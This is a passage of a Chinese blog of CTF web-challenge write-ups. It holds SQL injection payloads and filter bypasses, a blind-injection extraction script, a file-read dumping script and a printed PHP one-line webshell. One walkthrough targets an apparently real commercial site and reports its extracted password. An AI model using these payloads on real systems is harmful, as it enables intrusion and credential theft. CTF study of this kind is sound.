<p>出现zip -r flagbak.zip ./*<br>输上URL：<a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip</a><br>自动下载了flagbak.zip<br>解压里面就有flag<br>flag is:nctf{bash_history_means_what}</p>
<hr>
<h2 id="30-SQL注入2（400）"><a href="#30-SQL注入2（400）" class="headerlink" title="30.SQL注入2（400）"></a><strong>30.SQL注入2（400）</strong></h2><p>tip： 注入第二题~~主要考察union查询</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = $_POST[user];</span><br><span class="line">  $pass = md5($_POST[pass]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select pw from ctf where user='$user'"</span>));</span><br><span class="line">  <span class="keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>仔细看看代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$query = @mysql_fetch_array(mysql_query(<span class="string">"select pw from ctf where user='$user'"</span>));</span><br><span class="line"><span class="keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw])))</span><br><span class="line">观察发现只要让结果集中有你输入密码的MD5值就行嘿嘿</span><br></pre></td></tr></table></figure>
<p>这样就OK啦<br>flag: ntcf{union_select_is_wtf}</p>
<hr>
<h2 id="31-综合题2（400）"><a href="#31-综合题2（400）" class="headerlink" title="31.综合题2（400）"></a><strong>31.综合题2（400）</strong></h2><p>终于把这题给搞懂了，还看了别人的题解</p>
<ol>
<li>第一步</li>
</ol>
<p>点击本cms说明</p>
<p>出来一堆文件，发现file后面可接文件名，并将文件荡出来，于是写了python脚本，开始荡文件</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cms.nuptzj.cn/about.php?file=sm.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> HTMLParser</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">s=[<span class="string">'say'</span>,<span class="string">'config'</span>,<span class="string">'passencode'</span>,<span class="string">'index'</span>,<span class="string">'so'</span>,<span class="string">'antiinject'</span>,<span class="string">'antixss'</span>]</span><br><span class="line"></span><br><span class="line">h = HTMLParser.HTMLParser()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    url=<span class="string">"http://cms.nuptzj.cn/about.php?file=&#123;0&#125;.php"</span>.format(i);</span><br><span class="line">    f=codecs.open(str(i)+<span class="string">'.php'</span>,<span class="string">'w+'</span>,<span class="string">'utf-8'</span>)<span class="comment">#codecs可指定文件编码</span></span><br><span class="line">    s=requests.get(url)</span><br><span class="line">    s.encoding=<span class="string">'utf-8'</span></span><br><span class="line">    f.write(h.unescape(s.text))<span class="comment">#反转意html实体</span></span><br></pre></td></tr></table></figure>
<p>下面看看文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">so.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]!=<span class="string">"Xlcteam Browser"</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~'</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_POST[<span class="string">'soid'</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'antiinject.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'antixss.php'</span>;</span><br><span class="line">$id=antiinject($id);</span><br><span class="line">$con = mysql_connect($db_address,$db_user,$db_pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"不能连接到数据库！！"</span>.mysql_error());</span><br><span class="line">mysql_select_db($db_name,$con);</span><br><span class="line">$id=mysql_real_escape_string($id);</span><br><span class="line">$result=mysql_query(<span class="string">"SELECT * FROM `message` WHERE display=1 AND id=$id"</span>);</span><br><span class="line">$rs=mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">echo</span> htmlspecialchars($rs[<span class="string">'nice'</span>]).<span class="string">':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'</span>.antixss($rs[<span class="string">'say'</span>]).<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">mysql_free_result($result);</span><br><span class="line">mysql_free_result($file);</span><br><span class="line">mysql_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">say.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line">$nice=$_POST[<span class="string">'nice'</span>];</span><br><span class="line">$say=$_POST[<span class="string">'usersay'</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">'username'</span>]))&#123;</span><br><span class="line">setcookie(<span class="string">'username'</span>,$nice);</span><br><span class="line">setcookie(<span class="string">'userpass'</span>,<span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line">$username=$_COOKIE[<span class="string">'username'</span>];</span><br><span class="line">$userpass=$_COOKIE[<span class="string">'userpass'</span>];</span><br><span class="line"><span class="keyword">if</span>($nice==<span class="string">""</span> || $say==<span class="string">""</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('昵称或留言内容不能为空！(如果有内容也弹出此框，不是网站问题喔~ 好吧，给个提示：查看页面源码有惊喜！)');&lt;/script&gt;"</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$con = mysql_connect($db_address,$db_user,$db_pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"不能连接到数据库！！"</span>.mysql_error());</span><br><span class="line">mysql_select_db($db_name,$con);</span><br><span class="line">$nice=mysql_real_escape_string($nice);</span><br><span class="line">$username=mysql_real_escape_string($username);</span><br><span class="line">$userpass=mysql_real_escape_string($userpass);</span><br><span class="line">$result=mysql_query(<span class="string">"SELECT username FROM admin where username='$nice'"</span>,$con);</span><br><span class="line">$login=mysql_query(<span class="string">"SELECT * FROM admin where username='$username' AND userpass='$userpass'"</span>,$con);</span><br><span class="line"><span class="keyword">if</span>(mysql_num_rows($result)&gt;<span class="number">0</span> &amp;&amp; mysql_num_rows($login)&lt;=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('昵称已被使用，请更换！');&lt;/script&gt;"</span>;</span><br><span class="line">mysql_free_result($login);</span><br><span class="line">mysql_free_result($result);</span><br><span class="line">mysql_close($con);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">mysql_free_result($login);</span><br><span class="line">mysql_free_result($result);</span><br><span class="line">$say=mysql_real_escape_string($say);</span><br><span class="line">mysql_query(<span class="string">"insert into message (nice,say,display) values('$nice','$say',0)"</span>,$con);</span><br><span class="line">mysql_close($con);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("构建和谐社会，留言需要经过管理员审核才可以显示！");window.location = "./index.php"&lt;/script&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">passencode.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">passencode</span><span class="params">($content)</span></span>&#123;</span><br><span class="line"><span class="comment">//$pass=urlencode($content);</span></span><br><span class="line">$array=str_split($content);</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($array);$i++)&#123;</span><br><span class="line"><span class="keyword">if</span>($pass!=<span class="string">""</span>)&#123;</span><br><span class="line">$pass=$pass.<span class="string">" "</span>.(string)ord($array[$i]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$pass=(string)ord($array[$i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $pass;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">antixss.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">antixss</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">preg_match(<span class="string">"/(.*)\[a\](.*)\[\/a\](.*)/"</span>,$content,$url);</span><br><span class="line">$key=<span class="keyword">array</span>(<span class="string">"("</span>,<span class="string">")"</span>,<span class="string">"&amp;"</span>,<span class="string">"\\"</span>,<span class="string">"&lt;"</span>,<span class="string">"&gt;"</span>,<span class="string">"'"</span>,<span class="string">"%28"</span>,<span class="string">"%29"</span>,<span class="string">" on"</span>,<span class="string">"data"</span>,<span class="string">"src"</span>,<span class="string">"eval"</span>,<span class="string">"unescape"</span>,<span class="string">"innerHTML"</span>,<span class="string">"document"</span>,<span class="string">"appendChild"</span>,<span class="string">"createElement"</span>,<span class="string">"write"</span>,<span class="string">"String"</span>,<span class="string">"setTimeout"</span>,<span class="string">"cookie"</span>);<span class="comment">//因为太菜，很懒，所以。。。(过滤规则来自Mramydnei)</span></span><br><span class="line">$re=$url[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">if</span>(count($url)==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> htmlspecialchars($content);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=count($key);$i++)&#123;</span><br><span class="line">$re=str_replace($key[$i], <span class="string">'_'</span>,$re);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> htmlspecialchars($url[<span class="number">1</span>],ENT_QUOTES).<span class="string">'&lt;a href="'</span>.$re.<span class="string">'"&gt;'</span>.$re.<span class="string">'&lt;/a&gt;'</span>.htmlspecialchars($url[<span class="number">3</span>],ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">antiinject.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">antiinject</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">$keyword=<span class="keyword">array</span>(<span class="string">"select"</span>,<span class="string">"union"</span>,<span class="string">"and"</span>,<span class="string">"from"</span>,<span class="string">' '</span>,<span class="string">"'"</span>,<span class="string">";"</span>,<span class="string">'"'</span>,<span class="string">"char"</span>,<span class="string">"or"</span>,<span class="string">"count"</span>,<span class="string">"master"</span>,<span class="string">"name"</span>,<span class="string">"pass"</span>,<span class="string">"admin"</span>,<span class="string">"+"</span>,<span class="string">"-"</span>,<span class="string">"order"</span>,<span class="string">"="</span>);</span><br><span class="line">$info=strtolower($content);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=count($keyword);$i++)&#123;</span><br><span class="line"> $info=str_replace($keyword[$i], <span class="string">''</span>,$info);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $info;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">about.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">""</span> || strstr($file,<span class="string">'config.php'</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"file参数不能为空！"</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$cut=strchr($file,<span class="string">"loginxlcteam"</span>);</span><br><span class="line"><span class="keyword">if</span>($cut==<span class="keyword">false</span>)&#123;</span><br><span class="line">$data=file_get_contents($file);</span><br><span class="line">$date=htmlspecialchars($data);</span><br><span class="line"><span class="keyword">echo</span> $date;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('敏感目录，禁止查看！但是。。。')&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>注入</li>
</ol>
<p>id搜索后出现so.php，存在注入点soid。数据表名为admin 字段名username userpass<br>开始注入，利用burpsuit先报username的内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=<span class="number">1</span><span class="comment">/*/aandnd/*/</span>exists(selselectect<span class="comment">/*/usernamnamee/*/</span>frfromom<span class="comment">/*/admadminin/*/</span>limit <span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>判断出username字段长度为5，userpass字段长度为6<br>利用脚本爆内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">r'http://cms.nuptzj.cn/so.php'</span></span><br><span class="line">header=&#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Xlcteam Browser'</span>,</span><br><span class="line">&#125;</span><br><span class="line">dic=<span class="string">'0123456789abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">string=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        id=<span class="string">'1/**/anandd/**/exists(selselectect/**/*/**/frfromom/**/admadminin/**/where/**/oorrd(substr(usernamnamee,&#123;0&#125;,1))&gt;&#123;1&#125;)'</span>.format(str(i),str(ord(j)))<span class="comment">#只需将username更改为uerpass</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'soid'</span>:id</span><br><span class="line">        &#125;</span><br><span class="line">        s=requests.post(url=url,headers=header,data=data)</span><br><span class="line">        content=s.text</span><br><span class="line">        <span class="keyword">print</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(len(content)&lt;<span class="number">430</span>):</span><br><span class="line">            string+=j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> string</span><br></pre></td></tr></table></figure>
<p>结果为admin 1020117099010701140117011001160117<br>后面的加密算法在passencode.php里面解密为fuckruntu<br>有了账号密码就可以登后台了在about.php里有loginxlcteam</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cms.nuptzj.cn/loginxlcteam/</span><br></pre></td></tr></table></figure>
<p>登录</p>
<ol>
<li>一句话木马</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xlcteam.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'www'</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'wtf'</span>] =&gt; <span class="string">'|.*|e'</span>,);</span><br><span class="line">array_walk($arr, $e, <span class="string">''</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>典型的一句话木马<br>上网搜索<br>令www=preg_replace&amp;wtf=print_r(scandir(‘.’))<br>出flag</p>
<hr>
<h2 id="32-注入实战1（500）"><a href="#32-注入实战1（500）" class="headerlink" title="32.注入实战1（500）"></a><strong>32.注入实战1（500）</strong></h2><p>我超喜欢这道题说真的我学到了好多呢<br>看题</p>
<p><strong>1. 第一步</strong><br>首先利用order by 爆出字段数</p>
<p>order by 1000 时报错了<br><a href="http://www.backstagecommerce.ca/services.php?id=1" target="_blank" rel="noopener">http://www.backstagecommerce.ca/services.php?id=1</a> order by 1000</p>
<p>然后用二分法爆出他的字段数为19<br><strong>2. 第二步</strong><br>利用联合查询 爆出显示字段<br><a href="http://www.backstagecommerce.ca/services.php?id=-1%20union%20select1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#" target="_blank" rel="noopener">http://www.backstagecommerce.ca/services.php?id=-1%20union%20select1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#</a><br><em>这里的id=-1这是为什么呢，因为啊id如果不为-1 结果集里第一条就是该查询到的结果，而后面的select 内容并不会显示出来，所以这里要赋给没有的id，负值都可以。</em></p>
<p>这里爆出了3,6,7,8,9,10,11,12,13 这么多的显示字段，下一步我们用哪个字段都行来爆他的数据表<br>报表语句</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://www.backstagecommerce.ca/services.php?id=-9 union select 1,2,3,4,5,6,7,8,9,10,(select group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database()),12,13,14,15,16,17,18,19<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">主要是这句话</span><br><span class="line">(select group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database())</span><br><span class="line">把这句话放到显示字段位置上即可</span><br><span class="line">group_concat这里不多做解释，意思是多个字段查询的结果合并后在一行显示</span><br><span class="line">information_schema.tables里面有数据库中的所有表</span><br><span class="line">database()指的是当前数据库</span><br><span class="line">table_schema指的是所有数据库</span><br><span class="line">table_name 是属于information_schema.tables的表 相当于其中的一个元素</span><br><span class="line">如果不懂自己动手查吧</span><br></pre></td></tr></table></figure>
<p>爆出来的表名如下</p>
<p>有木有看见user数据表我们只关心这个，下一步要爆字段了<br><strong>3. 第三步</strong><br>这一步我们要爆字段<br>有了数据表字段还不好爆吗</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://www.backstagecommerce.ca/services.php?id=-9 union select 1,2,3,4,5,6,7,8,9,10,11,(select group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">'users'</span>),13,14,15,16,17,18,19<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">information_schema.columns 该数据库中的所有字段</span><br><span class="line">table_name 表的名字</span><br><span class="line">column_name 属于information_schema.columns中的元素</span><br><span class="line">看看都爆出来了什么字段</span><br></pre></td></tr></table></figure>
<p>看见没password字段 我们想要的东西在里面 下一步把值给爆出来吧！！！<br><strong>4. 第四步</strong><br>这一步 我们要爆他的密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.backstagecommerce.ca/services.php?id=-9 union select 1,2,3,4,5,6,7,8,9,10,11,(select password from  users),13,14,15,16,17,18,19<span class="comment">#</span></span><br><span class="line">也可以这样</span><br><span class="line">http://www.backstagecommerce.ca/services.php?id=-9 union select 1,2,3,4,5,6,7,8,9,10,11,(password),13,14,15,16,17,18,19 from  users<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>密码就在上图BSCmarketing24<br>然后再md5加密成 f3d6cc916d0739d853e50bc92911dddb<br>flag: nctf{f3d6cc916d0739d853e50bc92911dddb}</p>
<hr>
<h2 id="33-密码重置2（500）"><a href="#33-密码重置2（500）" class="headerlink" title="33.密码重置2（500）"></a><strong>33.密码重置2（500）</strong></h2><p>TIPS:<br>1.管理员邮箱观察一下就可以找到<br>2.linux下一般使用vi编辑器，并且异常退出会留下备份文件<br>3.弱类型bypass</p>
<p>根据源码发现了邮箱</p>
<p><a href="mailto:admin@nuptzj.cn" target="_blank" rel="noopener">admin@nuptzj.cn</a><br>tip2:<a href="http://www.cnblogs.com/DMDD/p/5052048.html" target="_blank" rel="noopener">上网搜了vi编辑器异常退出留下备份文件名</a></p>
<p>直接打开.submit.php.swp文件如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">源码如下</span><br><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">如果登录邮箱地址不是管理员则 die()</span></span><br><span class="line"><span class="comment">数据库结构</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- 表的结构 `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CREATE TABLE IF NOT EXISTS `user` (</span></span><br><span class="line"><span class="comment">  `id` int(11) NOT NULL AUTO_INCREMENT,</span></span><br><span class="line"><span class="comment">  `username` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `email` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `token` int(255) NOT NULL DEFAULT '0',</span></span><br><span class="line"><span class="comment">  PRIMARY KEY (`id`)</span></span><br><span class="line"><span class="comment">) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- 转存表中的数据 `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES</span></span><br><span class="line"><span class="comment">(1, '****不可见***', '***不可见***', 0);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">    <span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">    $sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</span><br><span class="line">    $r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</span><br><span class="line">    $r = mysql_fetch_assoc($r);</span><br><span class="line">    $r = $r[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"失败了呀"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong><em>重点在这</em></strong></p>
<div class="se-preview-section-delimiter"></div>

